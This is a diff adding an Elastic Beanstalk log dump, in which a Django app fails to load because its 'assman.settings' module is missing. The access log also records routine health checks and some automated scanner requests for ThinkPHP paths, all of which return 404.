@@ -1,0 +1,483 @@
+Retrieving logs...
+============= i-01c319abc46dd1916 ==============
+-------------------------------------
+/var/log/httpd/error_log
+-------------------------------------
+[Wed Jan 29 20:00:47.445491 2020] [:error] [pid 27266] [remote 127.0.0.1:0]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/core/wsgi.py", line 12, in get_wsgi_application
+[Wed Jan 29 20:00:47.445494 2020] [:error] [pid 27266] [remote 127.0.0.1:0]     django.setup(set_prefix=False)
+[Wed Jan 29 20:00:47.445500 2020] [:error] [pid 27266] [remote 127.0.0.1:0]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/__init__.py", line 19, in setup
+[Wed Jan 29 20:00:47.445504 2020] [:error] [pid 27266] [remote 127.0.0.1:0]     configure_logging(settings.LOGGING_CONFIG, settings.LOGGING)
+[Wed Jan 29 20:00:47.445509 2020] [:error] [pid 27266] [remote 127.0.0.1:0]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/conf/__init__.py", line 79, in __getattr__
+[Wed Jan 29 20:00:47.445512 2020] [:error] [pid 27266] [remote 127.0.0.1:0]     self._setup(name)
+[Wed Jan 29 20:00:47.445518 2020] [:error] [pid 27266] [remote 127.0.0.1:0]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/conf/__init__.py", line 66, in _setup
+[Wed Jan 29 20:00:47.445521 2020] [:error] [pid 27266] [remote 127.0.0.1:0]     self._wrapped = Settings(settings_module)
+[Wed Jan 29 20:00:47.445526 2020] [:error] [pid 27266] [remote 127.0.0.1:0]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/conf/__init__.py", line 157, in __init__
+[Wed Jan 29 20:00:47.445529 2020] [:error] [pid 27266] [remote 127.0.0.1:0]     mod = importlib.import_module(self.SETTINGS_MODULE)
+[Wed Jan 29 20:00:47.445534 2020] [:error] [pid 27266] [remote 127.0.0.1:0]   File "/opt/python/run/venv/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+[Wed Jan 29 20:00:47.445537 2020] [:error] [pid 27266] [remote 127.0.0.1:0]     return _bootstrap._gcd_import(name[level:], package, level)
+[Wed Jan 29 20:00:47.445543 2020] [:error] [pid 27266] [remote 127.0.0.1:0]   File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+[Wed Jan 29 20:00:47.445548 2020] [:error] [pid 27266] [remote 127.0.0.1:0]   File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+[Wed Jan 29 20:00:47.445554 2020] [:error] [pid 27266] [remote 127.0.0.1:0]   File "<frozen importlib._bootstrap>", line 953, in _find_and_load_unlocked
+[Wed Jan 29 20:00:47.445569 2020] [:error] [pid 27266] [remote 127.0.0.1:0] ModuleNotFoundError: No module named 'assman.settings'
+[Wed Jan 29 20:00:48.448682 2020] [:error] [pid 27266] [remote 127.0.0.1:24] mod_wsgi (pid=27266): Target WSGI script '/opt/python/current/app/assman/assman/wsgi.py' cannot be loaded as Python module.
+[Wed Jan 29 20:00:48.448730 2020] [:error] [pid 27266] [remote 127.0.0.1:24] mod_wsgi (pid=27266): Exception occurred processing WSGI script '/opt/python/current/app/assman/assman/wsgi.py'.
+[Wed Jan 29 20:00:48.448865 2020] [:error] [pid 27266] [remote 127.0.0.1:24] Traceback (most recent call last):
+[Wed Jan 29 20:00:48.448910 2020] [:error] [pid 27266] [remote 127.0.0.1:24]   File "/opt/python/current/app/assman/assman/wsgi.py", line 16, in <module>
+[Wed Jan 29 20:00:48.448914 2020] [:error] [pid 27266] [remote 127.0.0.1:24]     application = get_wsgi_application()
+[Wed Jan 29 20:00:48.448921 2020] [:error] [pid 27266] [remote 127.0.0.1:24]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/core/wsgi.py", line 12, in get_wsgi_application
+[Wed Jan 29 20:00:48.448924 2020] [:error] [pid 27266] [remote 127.0.0.1:24]     django.setup(set_prefix=False)
+[Wed Jan 29 20:00:48.448929 2020] [:error] [pid 27266] [remote 127.0.0.1:24]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/__init__.py", line 19, in setup
+[Wed Jan 29 20:00:48.448932 2020] [:error] [pid 27266] [remote 127.0.0.1:24]     configure_logging(settings.LOGGING_CONFIG, settings.LOGGING)
+[Wed Jan 29 20:00:48.448938 2020] [:error] [pid 27266] [remote 127.0.0.1:24]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/conf/__init__.py", line 79, in __getattr__
+[Wed Jan 29 20:00:48.448950 2020] [:error] [pid 27266] [remote 127.0.0.1:24]     self._setup(name)
+[Wed Jan 29 20:00:48.448955 2020] [:error] [pid 27266] [remote 127.0.0.1:24]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/conf/__init__.py", line 66, in _setup
+[Wed Jan 29 20:00:48.448958 2020] [:error] [pid 27266] [remote 127.0.0.1:24]     self._wrapped = Settings(settings_module)
+[Wed Jan 29 20:00:48.448963 2020] [:error] [pid 27266] [remote 127.0.0.1:24]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/conf/__init__.py", line 157, in __init__
+[Wed Jan 29 20:00:48.448966 2020] [:error] [pid 27266] [remote 127.0.0.1:24]     mod = importlib.import_module(self.SETTINGS_MODULE)
+[Wed Jan 29 20:00:48.448971 2020] [:error] [pid 27266] [remote 127.0.0.1:24]   File "/opt/python/run/venv/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+[Wed Jan 29 20:00:48.448974 2020] [:error] [pid 27266] [remote 127.0.0.1:24]     return _bootstrap._gcd_import(name[level:], package, level)
+[Wed Jan 29 20:00:48.448979 2020] [:error] [pid 27266] [remote 127.0.0.1:24]   File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+[Wed Jan 29 20:00:48.448983 2020] [:error] [pid 27266] [remote 127.0.0.1:24]   File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+[Wed Jan 29 20:00:48.448988 2020] [:error] [pid 27266] [remote 127.0.0.1:24]   File "<frozen importlib._bootstrap>", line 953, in _find_and_load_unlocked
+[Wed Jan 29 20:00:48.449002 2020] [:error] [pid 27266] [remote 127.0.0.1:24] ModuleNotFoundError: No module named 'assman.settings'
+[Wed Jan 29 20:00:49.452130 2020] [:error] [pid 27266] [remote 127.0.0.1:16412] mod_wsgi (pid=27266): Target WSGI script '/opt/python/current/app/assman/assman/wsgi.py' cannot be loaded as Python module.
+[Wed Jan 29 20:00:49.452179 2020] [:error] [pid 27266] [remote 127.0.0.1:16412] mod_wsgi (pid=27266): Exception occurred processing WSGI script '/opt/python/current/app/assman/assman/wsgi.py'.
+[Wed Jan 29 20:00:49.452318 2020] [:error] [pid 27266] [remote 127.0.0.1:16412] Traceback (most recent call last):
+[Wed Jan 29 20:00:49.452365 2020] [:error] [pid 27266] [remote 127.0.0.1:16412]   File "/opt/python/current/app/assman/assman/wsgi.py", line 16, in <module>
+[Wed Jan 29 20:00:49.452369 2020] [:error] [pid 27266] [remote 127.0.0.1:16412]     application = get_wsgi_application()
+[Wed Jan 29 20:00:49.452376 2020] [:error] [pid 27266] [remote 127.0.0.1:16412]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/core/wsgi.py", line 12, in get_wsgi_application
+[Wed Jan 29 20:00:49.452380 2020] [:error] [pid 27266] [remote 127.0.0.1:16412]     django.setup(set_prefix=False)
+[Wed Jan 29 20:00:49.452386 2020] [:error] [pid 27266] [remote 127.0.0.1:16412]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/__init__.py", line 19, in setup
+[Wed Jan 29 20:00:49.452390 2020] [:error] [pid 27266] [remote 127.0.0.1:16412]     configure_logging(settings.LOGGING_CONFIG, settings.LOGGING)
+[Wed Jan 29 20:00:49.452396 2020] [:error] [pid 27266] [remote 127.0.0.1:16412]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/conf/__init__.py", line 79, in __getattr__
+[Wed Jan 29 20:00:49.452399 2020] [:error] [pid 27266] [remote 127.0.0.1:16412]     self._setup(name)
+[Wed Jan 29 20:00:49.452405 2020] [:error] [pid 27266] [remote 127.0.0.1:16412]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/conf/__init__.py", line 66, in _setup
+[Wed Jan 29 20:00:49.452408 2020] [:error] [pid 27266] [remote 127.0.0.1:16412]     self._wrapped = Settings(settings_module)
+[Wed Jan 29 20:00:49.452413 2020] [:error] [pid 27266] [remote 127.0.0.1:16412]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/conf/__init__.py", line 157, in __init__
+[Wed Jan 29 20:00:49.452417 2020] [:error] [pid 27266] [remote 127.0.0.1:16412]     mod = importlib.import_module(self.SETTINGS_MODULE)
+[Wed Jan 29 20:00:49.452432 2020] [:error] [pid 27266] [remote 127.0.0.1:16412]   File "/opt/python/run/venv/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+[Wed Jan 29 20:00:49.452435 2020] [:error] [pid 27266] [remote 127.0.0.1:16412]     return _bootstrap._gcd_import(name[level:], package, level)
+[Wed Jan 29 20:00:49.452441 2020] [:error] [pid 27266] [remote 127.0.0.1:16412]   File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+[Wed Jan 29 20:00:49.452446 2020] [:error] [pid 27266] [remote 127.0.0.1:16412]   File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+[Wed Jan 29 20:00:49.452451 2020] [:error] [pid 27266] [remote 127.0.0.1:16412]   File "<frozen importlib._bootstrap>", line 953, in _find_and_load_unlocked
+[Wed Jan 29 20:00:49.452466 2020] [:error] [pid 27266] [remote 127.0.0.1:16412] ModuleNotFoundError: No module named 'assman.settings'
+[Wed Jan 29 20:00:50.455557 2020] [:error] [pid 27266] [remote 127.0.0.1:28] mod_wsgi (pid=27266): Target WSGI script '/opt/python/current/app/assman/assman/wsgi.py' cannot be loaded as Python module.
+[Wed Jan 29 20:00:50.455604 2020] [:error] [pid 27266] [remote 127.0.0.1:28] mod_wsgi (pid=27266): Exception occurred processing WSGI script '/opt/python/current/app/assman/assman/wsgi.py'.
+[Wed Jan 29 20:00:50.455822 2020] [:error] [pid 27266] [remote 127.0.0.1:28] Traceback (most recent call last):
+[Wed Jan 29 20:00:50.455875 2020] [:error] [pid 27266] [remote 127.0.0.1:28]   File "/opt/python/current/app/assman/assman/wsgi.py", line 16, in <module>
+[Wed Jan 29 20:00:50.455880 2020] [:error] [pid 27266] [remote 127.0.0.1:28]     application = get_wsgi_application()
+[Wed Jan 29 20:00:50.455886 2020] [:error] [pid 27266] [remote 127.0.0.1:28]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/core/wsgi.py", line 12, in get_wsgi_application
+[Wed Jan 29 20:00:50.455890 2020] [:error] [pid 27266] [remote 127.0.0.1:28]     django.setup(set_prefix=False)
+[Wed Jan 29 20:00:50.455896 2020] [:error] [pid 27266] [remote 127.0.0.1:28]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/__init__.py", line 19, in setup
+[Wed Jan 29 20:00:50.455899 2020] [:error] [pid 27266] [remote 127.0.0.1:28]     configure_logging(settings.LOGGING_CONFIG, settings.LOGGING)
+[Wed Jan 29 20:00:50.455905 2020] [:error] [pid 27266] [remote 127.0.0.1:28]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/conf/__init__.py", line 79, in __getattr__
+[Wed Jan 29 20:00:50.455908 2020] [:error] [pid 27266] [remote 127.0.0.1:28]     self._setup(name)
+[Wed Jan 29 20:00:50.455913 2020] [:error] [pid 27266] [remote 127.0.0.1:28]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/conf/__init__.py", line 66, in _setup
+[Wed Jan 29 20:00:50.455916 2020] [:error] [pid 27266] [remote 127.0.0.1:28]     self._wrapped = Settings(settings_module)
+[Wed Jan 29 20:00:50.455922 2020] [:error] [pid 27266] [remote 127.0.0.1:28]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/conf/__init__.py", line 157, in __init__
+[Wed Jan 29 20:00:50.455925 2020] [:error] [pid 27266] [remote 127.0.0.1:28]     mod = importlib.import_module(self.SETTINGS_MODULE)
+[Wed Jan 29 20:00:50.455930 2020] [:error] [pid 27266] [remote 127.0.0.1:28]   File "/opt/python/run/venv/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+[Wed Jan 29 20:00:50.455933 2020] [:error] [pid 27266] [remote 127.0.0.1:28]     return _bootstrap._gcd_import(name[level:], package, level)
+[Wed Jan 29 20:00:50.455939 2020] [:error] [pid 27266] [remote 127.0.0.1:28]   File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+[Wed Jan 29 20:00:50.455944 2020] [:error] [pid 27266] [remote 127.0.0.1:28]   File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+[Wed Jan 29 20:00:50.455949 2020] [:error] [pid 27266] [remote 127.0.0.1:28]   File "<frozen importlib._bootstrap>", line 953, in _find_and_load_unlocked
+[Wed Jan 29 20:00:50.455964 2020] [:error] [pid 27266] [remote 127.0.0.1:28] ModuleNotFoundError: No module named 'assman.settings'
+[Wed Jan 29 20:01:05.310286 2020] [:error] [pid 27266] [remote 172.31.48.120:28] mod_wsgi (pid=27266): Target WSGI script '/opt/python/current/app/assman/assman/wsgi.py' cannot be loaded as Python module.
+[Wed Jan 29 20:01:05.310337 2020] [:error] [pid 27266] [remote 172.31.48.120:28] mod_wsgi (pid=27266): Exception occurred processing WSGI script '/opt/python/current/app/assman/assman/wsgi.py'.
+[Wed Jan 29 20:01:05.310477 2020] [:error] [pid 27266] [remote 172.31.48.120:28] Traceback (most recent call last):
+[Wed Jan 29 20:01:05.310529 2020] [:error] [pid 27266] [remote 172.31.48.120:28]   File "/opt/python/current/app/assman/assman/wsgi.py", line 16, in <module>
+[Wed Jan 29 20:01:05.310534 2020] [:error] [pid 27266] [remote 172.31.48.120:28]     application = get_wsgi_application()
+[Wed Jan 29 20:01:05.310542 2020] [:error] [pid 27266] [remote 172.31.48.120:28]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/core/wsgi.py", line 12, in get_wsgi_application
+[Wed Jan 29 20:01:05.310545 2020] [:error] [pid 27266] [remote 172.31.48.120:28]     django.setup(set_prefix=False)
+[Wed Jan 29 20:01:05.310551 2020] [:error] [pid 27266] [remote 172.31.48.120:28]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/__init__.py", line 19, in setup
+[Wed Jan 29 20:01:05.310555 2020] [:error] [pid 27266] [remote 172.31.48.120:28]     configure_logging(settings.LOGGING_CONFIG, settings.LOGGING)
+[Wed Jan 29 20:01:05.310561 2020] [:error] [pid 27266] [remote 172.31.48.120:28]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/conf/__init__.py", line 79, in __getattr__
+[Wed Jan 29 20:01:05.310565 2020] [:error] [pid 27266] [remote 172.31.48.120:28]     self._setup(name)
+[Wed Jan 29 20:01:05.310570 2020] [:error] [pid 27266] [remote 172.31.48.120:28]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/conf/__init__.py", line 66, in _setup
+[Wed Jan 29 20:01:05.310574 2020] [:error] [pid 27266] [remote 172.31.48.120:28]     self._wrapped = Settings(settings_module)
+[Wed Jan 29 20:01:05.310579 2020] [:error] [pid 27266] [remote 172.31.48.120:28]   File "/opt/python/run/venv/local/lib/python3.6/site-packages/django/conf/__init__.py", line 157, in __init__
+[Wed Jan 29 20:01:05.310582 2020] [:error] [pid 27266] [remote 172.31.48.120:28]     mod = importlib.import_module(self.SETTINGS_MODULE)
+[Wed Jan 29 20:01:05.310588 2020] [:error] [pid 27266] [remote 172.31.48.120:28]   File "/opt/python/run/venv/lib64/python3.6/importlib/__init__.py", line 126, in import_module
+[Wed Jan 29 20:01:05.310591 2020] [:error] [pid 27266] [remote 172.31.48.120:28]     return _bootstrap._gcd_import(name[level:], package, level)
+[Wed Jan 29 20:01:05.310596 2020] [:error] [pid 27266] [remote 172.31.48.120:28]   File "<frozen importlib._bootstrap>", line 994, in _gcd_import
+[Wed Jan 29 20:01:05.310602 2020] [:error] [pid 27266] [remote 172.31.48.120:28]   File "<frozen importlib._bootstrap>", line 971, in _find_and_load
+[Wed Jan 29 20:01:05.310607 2020] [:error] [pid 27266] [remote 172.31.48.120:28]   File "<frozen importlib._bootstrap>", line 953, in _find_and_load_unlocked
+[Wed Jan 29 20:01:05.310629 2020] [:error] [pid 27266] [remote 172.31.48.120:28] ModuleNotFoundError: No module named 'assman.settings'
+
+
+
+-------------------------------------
+/opt/python/log/supervisord.log
+-------------------------------------
+2020-01-29 05:16:25,405 CRIT Supervisor running as root (no user in config file)
+2020-01-29 05:16:25,420 INFO RPC interface 'supervisor' initialized
+2020-01-29 05:16:25,420 CRIT Server 'unix_http_server' running without any HTTP authentication checking
+2020-01-29 05:16:25,420 INFO supervisord started with pid 3064
+2020-01-29 05:16:26,426 INFO spawned: 'httpd' with pid 3150
+2020-01-29 05:16:27,665 INFO success: httpd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
+2020-01-29 05:16:54,426 INFO stopped: httpd (exit status 0)
+2020-01-29 05:16:55,430 INFO spawned: 'httpd' with pid 3347
+2020-01-29 05:16:56,466 INFO success: httpd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
+2020-01-29 05:19:27,781 INFO stopped: httpd (exit status 0)
+2020-01-29 05:19:28,786 INFO spawned: 'httpd' with pid 3694
+2020-01-29 05:19:29,833 INFO success: httpd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
+2020-01-29 05:22:26,328 INFO stopped: httpd (exit status 0)
+2020-01-29 05:22:27,333 INFO spawned: 'httpd' with pid 4104
+2020-01-29 05:22:28,385 INFO success: httpd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
+2020-01-29 05:27:27,928 INFO stopped: httpd (exit status 0)
+2020-01-29 05:27:28,933 INFO spawned: 'httpd' with pid 4541
+2020-01-29 05:27:29,978 INFO success: httpd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
+2020-01-29 05:33:41,646 INFO stopped: httpd (exit status 0)
+2020-01-29 05:33:42,651 INFO spawned: 'httpd' with pid 5038
+2020-01-29 05:33:43,699 INFO success: httpd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
+2020-01-29 19:30:31,213 INFO stopped: httpd (exit status 0)
+2020-01-29 19:30:32,218 INFO spawned: 'httpd' with pid 23545
+2020-01-29 19:30:33,257 INFO success: httpd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
+2020-01-29 19:32:31,965 INFO stopped: httpd (exit status 0)
+2020-01-29 19:32:32,970 INFO spawned: 'httpd' with pid 23877
+2020-01-29 19:32:34,078 INFO success: httpd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
+2020-01-29 19:34:59,002 INFO stopped: httpd (exit status 0)
+2020-01-29 19:35:00,025 INFO spawned: 'httpd' with pid 24250
+2020-01-29 19:35:01,079 INFO success: httpd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
+2020-01-29 19:39:16,303 INFO stopped: httpd (exit status 0)
+2020-01-29 19:39:17,311 INFO spawned: 'httpd' with pid 24661
+2020-01-29 19:39:18,366 INFO success: httpd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
+2020-01-29 19:39:59,369 INFO stopped: httpd (exit status 0)
+2020-01-29 19:40:00,374 INFO spawned: 'httpd' with pid 24940
+2020-01-29 19:40:01,410 INFO success: httpd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
+2020-01-29 19:46:42,742 INFO stopped: httpd (exit status 0)
+2020-01-29 19:46:43,747 INFO spawned: 'httpd' with pid 25499
+2020-01-29 19:46:44,793 INFO success: httpd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
+2020-01-29 19:51:38,826 INFO stopped: httpd (exit status 0)
+2020-01-29 19:51:39,831 INFO spawned: 'httpd' with pid 25995
+2020-01-29 19:51:40,870 INFO success: httpd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
+2020-01-29 19:54:02,445 INFO stopped: httpd (exit status 0)
+2020-01-29 19:54:03,450 INFO spawned: 'httpd' with pid 26350
+2020-01-29 19:54:04,502 INFO success: httpd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
+2020-01-29 19:56:52,947 INFO stopped: httpd (exit status 0)
+2020-01-29 19:56:53,951 INFO spawned: 'httpd' with pid 26820
+2020-01-29 19:56:54,990 INFO success: httpd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
+2020-01-29 20:00:43,396 INFO stopped: httpd (exit status 0)
+2020-01-29 20:00:44,401 INFO spawned: 'httpd' with pid 27261
+2020-01-29 20:00:45,448 INFO success: httpd entered RUNNING state, process has stayed up for > than 1 seconds (startsecs)
+
+
+
+-------------------------------------
+/var/log/httpd/access_log
+-------------------------------------
+::1 (-) - - [29/Jan/2020:18:56:51 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:18:56:52 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+172.31.48.120 (195.154.211.33) - - [29/Jan/2020:19:00:37 +0000] "GET / HTTP/1.1" 404 196 "-" "masscan/1.0 (https://github.com/robertdavidgraham/masscan)"
+172.31.24.60 (45.135.83.233) - - [29/Jan/2020:19:11:08 +0000] "GET / HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
+172.31.48.120 (117.50.137.25) - - [29/Jan/2020:19:15:29 +0000] "GET /TP/public/index.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+172.31.48.120 (117.50.137.25) - - [29/Jan/2020:19:15:30 +0000] "GET /TP/index.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+172.31.48.120 (117.50.137.25) - - [29/Jan/2020:19:15:30 +0000] "GET /thinkphp/html/public/index.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+172.31.48.120 (117.50.137.25) - - [29/Jan/2020:19:15:30 +0000] "GET /html/public/index.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+172.31.48.120 (117.50.137.25) - - [29/Jan/2020:19:15:31 +0000] "GET /public/index.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+172.31.48.120 (117.50.137.25) - - [29/Jan/2020:19:15:31 +0000] "GET /TP/html/public/index.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+172.31.48.120 (117.50.137.25) - - [29/Jan/2020:19:15:31 +0000] "GET /elrekt.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+172.31.48.120 (117.50.137.25) - - [29/Jan/2020:19:15:32 +0000] "GET /index.php HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+172.31.48.120 (117.50.137.25) - - [29/Jan/2020:19:15:32 +0000] "GET / HTTP/1.1" 404 196 "-" "Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)"
+::1 (-) - - [29/Jan/2020:19:16:06 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:16:29 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:16:30 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:16:31 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:16:32 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:16:33 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:16:34 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:16:35 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:16:36 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:16:37 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:16:38 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:16:39 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:16:40 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:16:41 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+::1 (-) - - [29/Jan/2020:19:16:42 +0000] "OPTIONS * HTTP/1.0" 200 - "-" "Apache/2.4.41 (Amazon) mod_wsgi/3.5 Python/3.6.8 (internal dummy connection)"
+127.0.0.1 (-) - - [29/Jan/2020:19:30:35 +0000] "GET / HTTP/1.1" 404 196 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:30:36 +0000] "GET / HTTP/1.1" 404 196 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:30:37 +0000] "GET / HTTP/1.1" 404 196 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:30:38 +0000] "GET / HTTP/1.1" 404 196 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:32:35 +0000] "GET / HTTP/1.1" 404 196 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:32:36 +0000] "GET / HTTP/1.1" 404 196 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:32:37 +0000] "GET / HTTP/1.1" 404 196 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:32:38 +0000] "GET / HTTP/1.1" 404 196 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:35:02 +0000] "GET / HTTP/1.1" 404 196 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:35:03 +0000] "GET / HTTP/1.1" 404 196 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:35:04 +0000] "GET / HTTP/1.1" 404 196 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:35:05 +0000] "GET / HTTP/1.1" 404 196 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:39:20 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:39:21 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:39:22 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:39:23 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:40:03 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:40:04 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:40:05 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
+127.0.0.1 (-) - - [29/Jan/2020:19:40:06 +0000] "GET / HTTP/1.1" 500 527 "-" "Python-urllib/2.7"
